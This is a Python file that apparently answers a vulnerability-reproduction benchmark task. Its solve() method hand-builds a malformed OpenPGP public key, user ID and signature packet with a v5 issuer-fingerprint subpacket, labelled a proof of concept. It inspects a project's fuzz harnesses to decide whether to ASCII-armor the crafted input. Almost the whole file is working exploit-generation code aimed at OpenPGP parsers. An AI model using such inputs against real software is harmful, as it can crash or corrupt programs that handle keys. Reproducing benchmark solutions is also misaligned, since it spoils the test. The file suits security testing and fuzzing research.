import os
import re
import tarfile
import base64
from typing import Optional, Iterable, Tuple


def _crc24(data: bytes) -> int:
    crc = 0xB704CE
    poly = 0x1864CFB
    for b in data:
        crc ^= (b & 0xFF) << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= poly
    return crc & 0xFFFFFF


def _armor(data: bytes, kind: str = "PGP PUBLIC KEY BLOCK") -> bytes:
    b64 = base64.b64encode(data).decode("ascii")
    lines = [b64[i : i + 64] for i in range(0, len(b64), 64)]
    crc = _crc24(data)
    crc_bytes = bytes([(crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])
    crc_b64 = base64.b64encode(crc_bytes).decode("ascii")
    out = []
    out.append(f"-----BEGIN {kind}-----\n")
    out.append("\n")
    out.extend([ln + "\n" for ln in lines])
    out.append("=" + crc_b64 + "\n")
    out.append(f"-----END {kind}-----\n")
    return "".join(out).encode("utf-8")


def _pgp_len(n: int) -> bytes:
    if n < 192:
        return bytes([n])
    if n < 8384:
        n2 = n - 192
        return bytes([(n2 >> 8) + 192, n2 & 0xFF])
    return b"\xFF" + n.to_bytes(4, "big", signed=False)


def _pgp_pkt(tag: int, body: bytes) -> bytes:
    return bytes([0xC0 | (tag & 0x3F)]) + _pgp_len(len(body)) + body


def _mpi_from_int(v: int) -> bytes:
    if v == 0:
        return b"\x00\x00"
    bl = v.bit_length()
    b = v.to_bytes((bl + 7) // 8, "big")
    return bl.to_bytes(2, "big") + b


def _make_openpgp_poc_binary() -> bytes:
    fp32 = bytes(range(1, 33))

    issuer_fp_subpkt = bytes([34, 33, 5]) + fp32  # len=34 (type+data), type=33, keyver=5, fp=32 bytes
    sig_body = bytearray()
    sig_body += b"\x04"  # version
    sig_body += b"\x13"  # sig type (positive certification)
    sig_body += b"\x01"  # pkalgo (RSA)
    sig_body += b"\x08"  # hashalgo (SHA256)
    sig_body += (0).to_bytes(2, "big")  # hashed subpackets len
    sig_body += len(issuer_fp_subpkt).to_bytes(2, "big")  # unhashed subpackets len
    sig_body += issuer_fp_subpkt
    sig_body += b"\x00\x00"  # left16
    sig_body += _mpi_from_int(1)  # dummy RSA signature MPI

    sig_pkt = _pgp_pkt(2, bytes(sig_body))

    n_mpi = _mpi_from_int(1)
    e_mpi = _mpi_from_int(1)
    keymat = n_mpi + e_mpi
    pub_body = bytearray()
    pub_body += b"\x05"  # v5
    pub_body += (0).to_bytes(4, "big")  # created
    pub_body += b"\x01"  # RSA
    pub_body += len(keymat).to_bytes(4, "big")  # key material octet count (v5)
    pub_body += keymat
    pub_pkt = _pgp_pkt(6, bytes(pub_body))

    uid_pkt = _pgp_pkt(13, b"a")

    return pub_pkt + uid_pkt + sig_pkt


def _iter_source_files_from_tar(tf: tarfile.TarFile) -> Iterable[Tuple[str, bytes]]:
    for m in tf.getmembers():
        if not m.isfile():
            continue
        name = m.name
        low = name.lower()
        if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".cxx") or low.endswith(".h") or low.endswith(".hpp")):
            continue
        if m.size <= 0 or m.size > 2_000_000:
            continue
        f = tf.extractfile(m)
        if not f:
            continue
        try:
            data = f.read()
        except Exception:
            continue
        yield name, data


def _iter_source_files_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
    for dp, _, fns in os.walk(root):
        for fn in fns:
            low = fn.lower()
            if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".cxx") or low.endswith(".h") or low.endswith(".hpp")):
                continue
            path = os.path.join(dp, fn)
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            rel = os.path.relpath(path, root)
            yield rel, data


def _detect_prefers_armor(source_blobs: Iterable[bytes]) -> bool:
    armor_score = 0
    bin_score = 0
    for b in source_blobs:
        try:
            s = b.decode("utf-8", errors="ignore")
        except Exception:
            continue
        sl = s.lower()
        if "llvmfuzzertestoneinput" in sl:
            if "begin pgp" in sl or "-----begin pgp" in sl:
                armor_score += 4
            if "armor" in sl or "armored" in sl or "dearmor" in sl or "unarmor" in sl:
                armor_score += 3
            if "base64" in sl:
                armor_score += 1
            if "readpkt" in sl or "parsepkt" in sl or "parse_pkts" in sl or "parsepkts" in sl:
                bin_score += 1
            if "fread" in sl or "stdin" in sl:
                bin_score += 1
        else:
            if "-----begin pgp" in sl:
                armor_score += 1
    return armor_score > bin_score


def _gather_fuzzer_sources(source_iter: Iterable[Tuple[str, bytes]]) -> Tuple[bool, list]:
    fuzz_blobs = []
    for name, data in source_iter:
        if b"LLVMFuzzerTestOneInput" in data:
            fuzz_blobs.append(data)
    return (len(fuzz_blobs) > 0), fuzz_blobs


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_bin = _make_openpgp_poc_binary()

        prefer_armor = False
        if os.path.isdir(src_path):
            _, fuzz_blobs = _gather_fuzzer_sources(_iter_source_files_from_dir(src_path))
            if fuzz_blobs:
                prefer_armor = _detect_prefers_armor(fuzz_blobs)
            else:
                # fallback: scan a few non-fuzzer sources for armor hints
                sample = []
                for _, data in _iter_source_files_from_dir(src_path):
                    sample.append(data)
                    if len(sample) >= 20:
                        break
                if sample:
                    prefer_armor = _detect_prefers_armor(sample)
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    _, fuzz_blobs = _gather_fuzzer_sources(_iter_source_files_from_tar(tf))
                    if fuzz_blobs:
                        prefer_armor = _detect_prefers_armor(fuzz_blobs)
                    else:
                        sample = []
                        for _, data in _iter_source_files_from_tar(tf):
                            sample.append(data)
                            if len(sample) >= 20:
                                break
                        if sample:
                            prefer_armor = _detect_prefers_armor(sample)
            except Exception:
                prefer_armor = False

        if prefer_armor:
            return _armor(poc_bin, "PGP PUBLIC KEY BLOCK")
        return poc_bin